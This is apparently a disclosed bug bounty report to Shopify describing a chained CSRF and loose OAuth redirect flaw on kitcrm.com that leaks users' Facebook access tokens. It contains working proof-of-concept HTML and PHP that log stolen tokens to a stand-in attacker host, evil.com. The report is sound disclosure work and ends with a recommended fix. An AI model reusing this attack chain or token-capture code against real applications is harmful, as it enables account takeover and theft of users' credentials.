# Stealing users' facebook access tokens - kitcrm.com

## Report Details
- **Report ID**: 211477
- **URL**: https://hackerone.com/reports/211477
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2017-03-08T00:06:17.999Z
- **Disclosed**: 2017-03-15T21:45:59.073Z

## Reporter
- **Username**: zombiehelp54
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
**Summary:**
I have found a number of minor security vulnerabilities with no impact that when chained together will lead to an attacker being able to steal the current user's facebook access token provided for kitcrm.com

**Description:**
- In kitcrm.com, users register with their shopify account and the products in their store appear in **Priority Products** section.
- When a user tries to edit a priority product, the submitted request will contain the product image url as a POST parameter.
- Users can set their product image to anything, for example `http://evil.com/` will be accepted and added as the product image.
- Now each time the user visits `https://www.kitcrm.com/seller/onboarding/1`, the page will request `http://evil.com/` as an image.
- In `https://[shop].myshopify.com` there is no validation for the authenticity token, so there is a CSRF at the login endpoint (which has no impact at all)
- Users of `kitcrm.com` are authenticated automatically by visiting the endpoint `https://www.kitcrm.com/users/auth/shopify?shop=zh5409.myshopify.com` which redirects to `https://zh5409.myshopify.com/admin/oauth/authorize?client_id=1333a1b83ccdf7a7.....` then they are redirected back to `kitcrm.com` and logged in.
- Current `redirect_uri` configuration for Kitcrm facebook oauth application allows redirection to `https://www.kitcrm.com/<ANYTHING>`

Chaining all of what I mentioned above together, here is how an attacker will be able to steal users' facebook access tokens: 

- An attacker registers a shopify store and then uses it to register a `kitcrm.com` account.
- After that he modifies his priority product image url to `https://evil.com/log_token.php`
- Then he tricks the victim into visiting a specially crafted HTML page that will:
   - CSRF login the victim into the attacker's store
   - CSRF login the victim into `kitcrm.com` 
   - Redirect the victim to `https://www.facebook.com/v2.7/dialog/oauth?client_id=372033192897621&redirect_uri=https%3A%2F%2Fwww.kitcrm.com%2Fseller/onboarding/1&response_type....` which will redirect him back to `https://www.kitcrm.com/seller/onboarding/1?code=[fb_token]`
- After the victim is redirected from facebook to kitcrm.com, a request will be sent to `https://evil.com/log_token.php` with the user's CSRF token in the referrer header.
- Now the attacker can store the token at his server and use it to access the user's facebook account.

**Proof of concept:**
I have created a live proof of concept that does all of that and stores the access token at `tokens.log` file. 
It can be found here: https://alazzazpp.com/shopify/steal.html (Please note that you should allow your browser to access `https://alazzazpp.com` with https since it doesn't have a valid SSL certificate.) 
Also, here is a PoC video:
{F167006}

**PoC Code:**
> Steal.html

```html
<script>
window.onload = function () { 
  window.setTimeout(function() {
              document.getElementById("token").innerHTML = "<iframe src='https://www.kitcrm.com/users/auth/shopify?shop=zh5409.myshopify.com'></iframe>";   
          }, 5000);
          window.setTimeout(function() {
               window.open('https://www.facebook.com/v2.7/dialog/oauth?client_id=372033192897621&redirect_uri=https%3A%2F%2Fwww.kitcrm.com%2Fseller/onboarding/1&response_type=code&scope=email%2Cmanage_pages%2Cread_insights%2Cads_management%2Cpublish_actions%2Cbusiness_management%2Cpublish_pages');
          }, 10000);
finished = 0;
var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
if (this.readyState == 4 && this.status == 200 && this.responseText.length > 0) {
     document.getElementById("token").innerHTML = "<b>Your access token is: <br></b>" +this.responseText;
     alert(this.responseText);
     finished = 1;
   }
 };
function fetchToken(){ 
 xhttp.open("GET", "tokens.log?"+Math.random(), true);
 xhttp.send();
 if (finished == 1){
   clearInterval(interval);
 }
}
var interval = setInterval(function(){ fetchToken() } , 10000);
}
</script>
<h4>If no window was opened click <a href="https://www.facebook.com/v2.7/dialog/oauth?client_id=372033192897621&redirect_uri=https%3A%2F%2Fwww.kitcrm.com%2Fseller/onboarding/1&response_type=code&scope=email%2Cmanage_pages%2Cread_insights%2Cads_management%2Cpublish_actions%2Cbusiness_management%2Cpublish_pages" target="_blank">here</a>: 

<div id="token"><h3>Your access token should appear soon.....</h3></div>
<iframe src='data:text/html,<form action="https://zh5409.myshopify.com/admin/auth/login" method="post">
<input name="utf8" value=""><input name="redirect"><input name="highlight=><input name="subdomain" value=zh5409><input name="login" value=███><input name="password" value=P@ss123lol><input name="[remember]" value=1>
</form><script>document.forms[0].submit()</script>'></iframe>
<div id="csrf_login"></div>
```

> log_token.php

```php
<?php
header("Access-Control-Allow-Origin: *");
$referrer = $_SERVER['HTTP_REFERER'];
$token = substr($referrer, strpos($referrer, "=") + 1);    
$fp = fopen('tokens.log', 'w');
fwrite($fp, $token."\n");
fclose($fp);
?>
```

**Recommended fix:**
Mitigation of this vulnerability is pretty simple, just set your facebook oauth application `redirect_uri` to the exact callback endpoint and remove the domain from the white list.

## Attachments
No attachments
